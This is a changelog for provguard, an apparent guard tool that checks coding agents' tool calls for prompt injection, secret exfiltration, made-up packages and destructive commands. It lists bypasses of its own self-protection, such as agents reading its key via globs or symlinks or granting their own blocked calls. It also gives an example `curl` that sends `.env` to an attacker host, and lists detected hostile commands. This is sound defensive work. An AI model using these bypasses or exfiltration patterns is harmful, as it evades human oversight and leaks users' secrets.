# Changelog

## Unreleased

### Added
- **Dependency gate** (opt-in: `provguard config package-check on`). Package names that the agent installs or runs with `npm`, `pnpm`, `yarn`, `bun`, `npx`, `pip`, `uv`, `uvx`, `pipx`, `poetry` or `cargo` are looked up on npm, PyPI or crates.io. A name the registry does not know is blocked, because the agent may have made it up (slopsquatting). A package first published under 30 days ago needs your approval (strict: blocked). This works in clean sessions too. Answers are cached for 24 hours. A registry that does not answer within 3 seconds lets the call run. Calls that use a private registry or mirror, and `npx` of a binary already in `node_modules`, are skipped.
- `provguard pkg npm|pypi|cargo <name>...`: the same check by hand, with the first publish date, install scripts and (crates.io) downloads.
- Benchmark cases 18–20 (made-up npm package, two-day-old PyPI package, made-up `npx` tool) and normal-work task b32, which installs known packages.

### Changed
- Install commands name only their packages: option values (`npm --prefix web install x`, `cargo install --root dir x`, `uv add --group dev x`) no longer count as package names, and `npx -p pkg`, `uvx --from pkg` and `pipx run pkg` name the package they run. `cargo add` now counts as a package install.

### Fixed
- The notice for hidden text showed an empty reason ("hides text from you ()") when the same output also made the session untrusted for another reason, such as `gh` output. It now names the kind of hidden text (for example "a run of zero-width characters"). Found live.

## v0.5.2 — fewer false alarms, trust states, security hardening

### Changed
- `provguard status` shows ⚪ **not tracked** for a session that no provguard hook has seen, instead of "clean", and asks you to run `doctor` when a session record cannot be read. To tell the two apart, a hook now saves a clean session once (one small file per session).
- `provguard reset` lists the untrusted sources, numbered, and `--source N` clears only one of them after you checked it. The label goes with the last source, unless older sources were dropped from the full list (50). Flags may now follow the session id (`reset latest --source 2 --yes`; the same for `explain`).
- Claude Code: a trust-state notice also goes to the agent (`additionalContext`), which is asked to tell you, because the desktop app does not show `systemMessage`. In the CLI you may see the notice twice. Not yet tested live in the desktop app.
- A token found while reading a test file marks the session sensitive again when it looks random. Only tokens that look fake (they name themselves "fake", "test", "example" and the like, decode to such a name, or are too regular to be random) are skipped, so a real token committed to a test file is no longer missed.
- `provguard init` ends with a short legend of the trust states (🟡 untrusted, 🟠 sensitive, 🔴 both), what the chosen mode does in each, and `provguard explain latest` to see why a session has its state.
- `provguard review` counts the sessions in each trust state and points to `provguard explain latest`, because many agents (and the Claude desktop app) do not show provguard's notice when a state changes.
- `provguard uninstall` names every session whose title may still show a trust icon, and says how each gets its old title back: a message in that session (the cleanup hook) or a rename. `uninstall --now` names them too, because it leaves those icons; its preview (without `--yes`) shows the list first. The app owns session titles, so provguard can change one only through a hook answer while a message is sent in that session, not at the moment of uninstall. provguard now records each marked title's text for this; records from older versions show as the session id.
- README: a session that was renamed (by you or by a tool) does not get the title icon, because the app keeps such a title.
- README: a table of which agents show that notice and which show a session-title icon, with the source for each (agent docs or live test).

### Security
- Self-protection blocks recursive reads of a folder that holds provguard's folder, because they read its key: `grep -r … ~`, `tar … ~`, `cp -r ~`, `rsync -a ~/`, `zip -r … ~`, `find ~ … -exec`, `find ~ | xargs …`, `rg --hidden … ~`, `Get-ChildItem ~ -Recurse | Select-String`, `Copy-Item ~ -Recurse`, `Compress-Archive ~`, also a recursive read of `.` in the home folder. A read that leaves the folder out (`--exclude-dir=.provguard`, `--exclude=.provguard`) is allowed, and so are `rg` and `ag` without `--hidden`, which skip hidden folders.
- A secret sent out in parts is caught: for each random-looking secret a session reads, provguard also keeps fingerprints of every 10-character piece, and a call that sends one of them out (plain, reversed, or base64, hex or URL encoded) is blocked like the whole secret. This costs about 0.3 ms for a typical command and 5 ms for a 9 KB one, and only in sessions that read a secret.
- At session start, provguard checks the instruction files the agent loads without a tool call (`CLAUDE.md`, `AGENTS.md`, `.claude/CLAUDE.md`, `GEMINI.md`, `.cursorrules`, …) in the repo root and the working folder. Hidden text marks the session untrusted with the deny escalation; a prompt-injection phrase, `disableAllHooks` or decode-and-run code marks it untrusted. The notice names the file.
- After an agent runs `git clone`, provguard checks the new repo's `.claude/settings.json`: if it sets `disableAllHooks`, which turns provguard off as soon as the repo is opened, you get a warning not to open it until you have checked it.
- The install scripts check the signed build provenance (`gh attestation verify`) of releases after 0.5.1 when the GitHub CLI is installed and signed in, and install nothing if the check fails. Without `gh` they say the check was skipped.

### Fixed
- `rsync --exclude .provguard` (value as a separate word) was read as a folder to copy, so provguard thought rsync would write `<destination>/.provguard` and blocked it. The word after an rsync option that takes a value (`--exclude`, `--include`, `--filter`, `-e`, `--exclude-from`, …) is now that option's value.
- Hook commands quote the binary path correctly for each shell. Before, a path with `$`, a backtick or a double quote was expanded or broken by sh, and on Windows a path with `&`, `;` or parentheses was left unquoted. Paths that need it are now single-quoted (sh) or run with `& '…'` (PowerShell); ordinary paths are written as before. `doctor` reads both the new and the old forms.
- Self-protection no longer blocks `find` or `fd` on a path or pattern that contains "provguard" (`find ~/src/provguard -name x`). They are blocked only when the command they run (after `-exec`, `-execdir`, `-ok`, `-okdir`, or fd's `-x`/`-X`) names provguard.
- **Self-protection: agents could read provguard's key and session files** through spellings the check missed: globs (`~/.provguard/*`, `k?y`, `.prov*/key`), parts known only at run time (`$(…)`, loop variables), the whole folder (`tar`, `zip`, `grep -r`, `Copy-Item -Recurse`, a pipe from `Get-ChildItem`), `cd` into the folder followed by a relative name, the Grep tool on the folder, and MCP file servers that read or search. All of these are now blocked; listing names (`ls`, `Get-ChildItem`, MCP `list_directory`) and reading `config.json`, the audit log and the binary stay allowed. The threat model documents the remaining limit: a recursive read of the whole home folder.
- The README and CHANGELOG no longer mention a `provguard-badge` desktop mod: it was never published.

### Added
- `provguard doctor` reports the version of the binary the hooks actually run, and a MEDIUM finding when it differs from the provguard you ran the check with, because `init` copies the binary and nothing afterwards says it stayed behind. Found live: a fixed build sat uninstalled while the old binary kept crashing, and the only signs were the agent's "a hook gave no usable answer" notice and panics in the audit log.
- CI on Linux (x64, ARM), macOS (Apple Silicon, Intel) and Windows: vet, tests, the benchmark and the end-to-end install test on every push and pull request.
- Release workflow: pushing a tag builds the binaries, signs their build provenance with Sigstore (`gh attestation verify <file> --repo durgavarapraveen/provguard`) and publishes the release with notes from this file.
- `CONTRIBUTING.md`, `CODE_OF_CONDUCT.md`, issue templates (bug, false positive, new agent; bypasses go to private reporting) and a pull request template.
- README: a short opening for the 10 agents, badges, and an animated demo (`docs/demo.svg`).

## v0.5.1 — fixes found by end-to-end testing

### Fixed (found by end-to-end testing before launch)
- **Claude Code calls were taken for Devin's.** Claude Code 2.1.238 sends `prompt_id` in every hook call, which was how provguard recognized Devin, so Claude Code got answers in Devin's format. provguard now also checks for `transcript_path`, which Claude Code always sends and Devin does not.
- **Antigravity denied every tool call** when provguard had no decision: Antigravity treats a PreToolUse reply without a decision as a denial. provguard now answers `{"decision":"allow"}`, which hands the call to Antigravity's own permission rules.
- `install.ps1` installs with the defaults when there is no terminal (a CI job, a script), like `install.sh`. Before, it only showed the change and installed nothing.
- Gemini CLI is no longer taken as installed when only Antigravity has created `~/.gemini`.
- Tests that use Windows paths now run only on Windows, so the test suite passes on Linux and macOS.

### Added
- `scripts/e2e.sh` (Linux, macOS) and `scripts/e2e.ps1` (Windows) install a release in a throwaway home folder and test every agent's hooks, `doctor --live`, `check`, self-protection, hidden text, a repository policy, `demo`, `bench` and uninstall.

## v0.5.0 — hidden text, your own rules, team policy

### Added
- Hidden-text detection: tool output that hides text from the user (Unicode tag characters, bidirectional overrides, runs of zero-width characters, or an HTML comment or invisible element with instructions to an AI) makes the session untrusted, even for a file in a trusted repository. In such a session, the asks for untrusted destinations and for lasting changes, remote code or unreadable code become blocks. The user gets a notice naming the trick.
- Your own rules in `config.json`: `rules` (match a command by its words, a regular expression, or a tool name; `ask` or `deny`), `packs` (built-in rule sets: `terraform`, `kubernetes`, `aws`, `gcloud`, `azure`), `sensitive_paths` (more files that count as secrets) and `blocked_hosts` (never send data there). They apply after the built-in blocks, so they cannot hide a leak.
- Team policy in a repository: `.provguard/policy.json` adds rules, packs, sensitive paths and blocked hosts, and can raise the mode. It can never weaken a check; agents cannot change or remove it; `provguard doctor` reports it; `provguard check` uses it.

## v0.4.0 — check, live hook test, destructive commands

### Added
- `provguard check "<command>"`: shows what provguard would do with a shell command, and why, without running it or writing anything. `--untrusted` and `--secrets` judge it as in a session that read untrusted content or secrets; `--session` uses a real session's state. Exit code 0 when allowed, 1 when it would ask or block.
- `provguard doctor --live`: sends a test write to a protected file through each installed agent's hook, with the agent's own payload, and checks that the answer is a block in that agent's reply format. Test calls use a temporary provguard home, so they leave nothing in the audit log. Each adapter now has a `Probe` method for this.
- More destructive commands ask first, in every session: `terraform`/`tofu` destroy, `pulumi destroy`, cluster-wide `kubectl delete` (namespaces, volumes, CRDs, nodes, `--all`), `helm uninstall`, `docker system prune` and volume removal, cloud deletes (`aws … delete-*`/`terminate-*`, `aws s3 rb`, recursive `s3 rm`, `gcloud`/`az … delete`, `gsutil rb`), SQL that drops or empties a table (`DROP`, `TRUNCATE`, `DELETE` without `WHERE`), `FLUSHALL`, `dropdb`, `dd` to a disk device, and PowerShell disk cmdlets.

### Changed
- `provguard init` asks one question for the coding agents to protect: `all` (Claude Code and every agent found), or the numbers of the ones you want, Claude Code included. Choosing only other agents leaves Claude Code's settings unchanged.

## v0.3.0 — more coding agents

provguard now protects nine coding agents besides Claude Code. `provguard init` finds the installed ones and adds provguard to each; `provguard uninstall` removes it from all. None has been tested live in its agent yet: please report what you see.

### Added
- Cursor support: Cursor runs the Claude Code hooks, and provguard now understands its payloads (camelCase events, `Shell`, `Delete`, `MCP:<tool>`, `conversation_id`) and answers in Cursor's format. Agents are now adapters behind one interface (`internal/adapter/core`), one package per agent.
- GitHub Copilot support (VS Code, Copilot app, Copilot CLI): `init` installs `~/.copilot/hooks/provguard.json` (`provguard hook --agent copilot`), `uninstall` removes it, and self-protection covers Copilot's hook files and `disableAllHooks` in its settings.
- OpenAI Codex support: `init` adds provguard to `~/.codex/hooks.json` (keeping other hooks), `uninstall` removes it; file edits through `apply_patch` are checked file by file; self-protection covers `.codex/config.toml` (`[features] hooks = false`), `hooks.json` and `requirements.toml`. Settings files are written without HTML escaping.
- Gemini CLI support: `init` adds provguard to `~/.gemini/settings.json` (keeping other settings), `uninstall` removes it; Gemini's tool names are mapped (`run_shell_command`, `read_file`, `write_file`, `replace`, `web_fetch`, ...); self-protection guards `hooks` and `hooksConfig` in `.gemini/settings.json`.
- Devin (formerly Windsurf) support: Devin runs the Claude Code hooks; provguard recognizes its payloads (`prompt_id`, tools `exec`, `read`, `write`, `edit`, `apply_patch`, `webfetch`) and replies in its format. Self-protection guards `hooks` and `read_config_from` in Devin's config files and `.devin/hooks.v1.json`. The `apply_patch` parser moved to `internal/adapter/core`, shared by Codex and Devin.
- Kiro support (IDE and CLI V3): `init` adds `~/.kiro/hooks/provguard.json`, `uninstall` removes it; Kiro's tool names are mapped; blocks use Kiro's non-zero exit code with the reason on stderr; self-protection covers `.kiro/hooks`. Adapters now return a `core.Response` (stdout, stderr, exit code), and the hook command line is built in one place (`core.HookCommand`).
- Factory Droid support: `init` adds provguard's hooks to `~/.factory/hooks.json`, `uninstall` removes them; Droid's tool names (Execute, Create, ApplyPatch, FetchUrl) are mapped; self-protection covers `.factory/hooks.json`, `.factory/hooks/` and `.factory/settings*.json`. The hook-file installer is shared (`install.AddHooksFile`, `install.RemoveHooksFile`) by Codex, Gemini CLI and Droid.
- OpenCode support: `init` writes the plugin `~/.config/opencode/plugins/provguard.js` (V1 and V2 plugin APIs), `uninstall` removes it. The plugin runs `provguard hook --agent opencode` for tool calls and prompts and blocks a denied tool call by throwing; it fails closed when provguard cannot run. OpenCode's tool and argument names are mapped; self-protection covers `.opencode/plugins`, `.config/opencode/plugins` and `opencode.json[c]`.
- Antigravity support (app, CLI and IDE): `init` adds a `provguard` entry to `~/.gemini/config/hooks.json`, `uninstall` removes it. Antigravity's tool and argument names are mapped; PreInvocation stands in for a prompt event; asks use `force_ask`. Every Antigravity hook call prints JSON (`core.AlwaysReplies`), because Antigravity blocks a tool call whose hook prints none. Self-protection covers `.gemini/config/hooks.json` and `.agents/hooks.json`.
- Each agent lives in its own package under `internal/adapter` (one `core.Adapter` interface, one registry); shared code (hook command line, hook-file installer, patch paths) is in one place.

## v0.2.0 and v0.2.1

### Added
- `provguard allow <token>`: the user lets one blocked call through once (same session, tool and text; 10 minutes). Tokens are HMACs with the install key; agents cannot run the command.
- `allowed_hosts` now also exempts data sent to those hosts from the egress rules.
- `trusted_content_hosts`: the hosts whose fetched content is trusted, split out of `allowed_hosts`, which now permits sending only. `provguard doctor` reports entries where anyone can publish (`github.com`, paste sites) or that are too broad.
- `"block_mode": "ask"` turns `balanced` denies into an approval prompt.
- Session title icon and `provguard status` for the trust state.

### Easier to use
- One-line install scripts (`scripts/install.sh`, `scripts/install.ps1`) that check the binary's SHA-256 and start the setup.
- Guided `provguard init`: three questions (trusted repo owners, mode, block or ask), then a short summary. `--yes` still installs without questions.
- `provguard config` shows and changes settings, so nobody edits JSON by hand. Agents may read the settings, not change them.
- Block messages are one plain sentence plus the next step (`provguard allow`, `provguard config allow-host`). The audit log keeps the technical reason.
- `provguard review` groups what was stopped, or would have been, and says what to do next. In watch-only mode, provguard suggests a review once after three days.
- `provguard help`; the help text is grouped for new users.
- The setup offers to add provguard to your PATH and does it (Windows user PATH, or a tagged line in the shell start-up file on macOS and Linux); uninstall removes it. The install scripts print a plain message when no release is found.
- `provguard uninstall` removes provguard completely, `~/.provguard` included, and gives marked sessions their old title back: a small cleanup hook restores each title on your next message there, then removes itself (at the latest after 30 days). `--now` skips that; `--keep-data` keeps logs and settings.

### Fewer false alarms (found with `provguard review` on a real log)
- `gh pr create` and other gh writes to your own repository are not counted as data leaving.
- `sh -n` / `bash -n` (syntax check only) no longer counts as running the script. Also fixes a bypass: `bash -e x.sh` skipped the script scan.
- `gh … --help` and `git … --help` run nothing and are not counted as deletes or pushes.
- `sed -i -e 'script' file`: the script is no longer read as a file name.
- `& "$env:USERPROFILE\…\tool.exe"` and `"$HOME/bin/tool"` name a known program instead of an unknown command; checks by program name, self-protection included, apply to it.
- Recursive deletes inside the system temp folder do not ask, in a session that has not read untrusted content.
- Fake tokens in test files do not mark a session sensitive (finding F16); they are still fingerprinted, so sending one out is still stopped.

### Fixed (independent review of the changes above)
- gh writes counted as "your own repository" too often: an issue or pull request given as a link (`gh issue comment https://github.com/attacker/x/issues/1`), `-R` inside an option group (`-dR`) or given twice, a `cd`, `gh repo set-default`, `git remote`/`config` or an environment change earlier in the same command, `GH_REPO` built from pieces, and publishing actions (`release create`, `repo edit --visibility public`, `issue transfer`) or file input (`--body-file`, `$(cat …)`). Now every listed repository must be yours, the folder is resolved for the whole command line, and those actions get no exemption. `gh pr create` is checked for secrets in the commits it pushes.
- `echo mode audit | xargs provguard config` (and `find -exec`, `parallel`) changed settings; quoted subcommands inside scripts were missed.
- `bash -eo pipefail x.sh` skipped the script scan.
- The "always allow this host" hint could name the attacker's host (no scheme, or a subdomain).
- A link inside `testdata/` to a real secret file counted as a fixture; paths are now resolved through the OS, junctions included (shared `internal/realpath`).
- `git submodule foreach`, `git bisect run`, `git rebase --exec`, `git filter-branch` and `git -c alias.…` run commands; they are now code provguard cannot read.
- `provguard review` printed control characters from logged commands to the terminal.
- Install scripts: exact checksum-line match, Apple Silicon under Rosetta, containers without a terminal, and `install.ps1` no longer changes settings in the user's PowerShell window.

### Fixed (security audit, Nov 2026)
- Self-protection: code provguard cannot read (`python -c`, `eval`, a script file) could run `provguard allow <token>` and grant the agent's own blocked call. Script files are now streamed whole in overlapping windows, instead of one capped read of the start, and the pattern covers globbed spellings of `.provguard` and `.claude/settings*.json`.
- Self-protection: provguard's binary could be copied out of any folder but `~/.provguard/bin` and run under another name. Copies are matched by the binary's own name, and looking its path up (`which provguard`) is blocked.
- Egress: `allowed_hosts` read the text after the last `@`, so `curl --data-binary @.env attacker.test/u@your-host.com` passed every rule. The host is now the authority, which ends at the first `/`.
- Labels: a contributor's pull request content (`gh api .../pulls/4/files`, `gh pr view --json headRefName`, `gh pr checkout`) counted as the repo owner's own writing in a trusted repo, so it did not taint the session.
- Audit log: policy reasons, sink names, notices and labels are redacted like the rest of the record. A secret inside a blocked URL or command used to be written in full.
- Self-protection: the key and session files were only protected from reading when the path said `key`, `session` or `provguard`, so a junction or symlink under any other name read them. Paths a tool names are now always resolved through the OS, and a shell command's arguments share a budget of lookups.
- Sessions: `store.GC` removed every entry older than its age limit, lock files included, so a hook holding the lock of a long-idle session lost it mid-update. GC now ages session files only, clears locks and temp files once they are an hour old, and leaves anything else alone.
- Fail-closed: in `balanced`, a check that crashes now denies the call when the session has read both untrusted content and secrets (`audit` still never denies; `strict` denies everything it cannot check). `provguard doctor` reports a PreToolUse hook whose `onFailure` no longer matches the profile, and says that a timed-out hook blocks only in `strict`.
- Benchmark: cases 15, 16 and 17 cover these, and `provguard doctor` reports risky `trusted_content_hosts`.

## v0.1.0 — first public release

### Protection
- Session labels: untrusted (web, fetch commands, third-party MCP, vendored code, untrusted repo owners, tainted subagents, sessions started in untrusted repos) and sensitive (secret files, env dumps, tokens in output or prompt). Secrets are stored as HMAC fingerprints only.
- Shell analysis: Bash parsed with mvdan.cc/sh (pipes, subshells, substitutions, heredocs, variables, wrappers such as `sudo`, `bash -c`, `python -c`); PowerShell tokenizer (quotes, subexpressions, script blocks, here-strings, aliases, parameters). Sink classes: EGRESS, PERSIST, DESTROY, EXEC_REMOTE, OPAQUE.
- Policy with six rules, including secret-in-call matching through base64, hex, URL encoding and DNS labels, and the lethal-trifecta rule.
- Profiles: `audit` (default), `balanced`, `strict` (fails closed).
- Self-protection in every profile: hook settings, `~/.provguard/`, the installed binary, and agent runs of `init`/`uninstall`/`reset`. MCP terminal tools are checked like shells.

### Commands
- `init`, `uninstall`, `doctor`, `explain`, `reset`, `demo`, `bench`.

### Benchmark
- 14 attack cases and 31 normal tasks. `balanced`: 10 blocked, 4 asked, 0 missed; 0 false positives in 86 calls.

### Security review fixes (before release)
- 13 critical self-protection bypasses and 9 high-severity issues found in a full review are fixed, each with a regression test. See docs/FINDINGS.md (F15).
- Paths are checked as the OS resolves them (junctions, symlinks, 8.3 names, trailing dots, `::$DATA`).
- More guarded settings keys (`env`, `statusLine`, `apiKeyHelper`, …); secrets are checked in commits before a push; `gh` output is trusted only when outsiders cannot have written it.

### Known limitations
- See docs/THREAT_MODEL.md. Real-agent benchmark runs, `ConfigChange` and `onFailure: block` are not yet verified live.
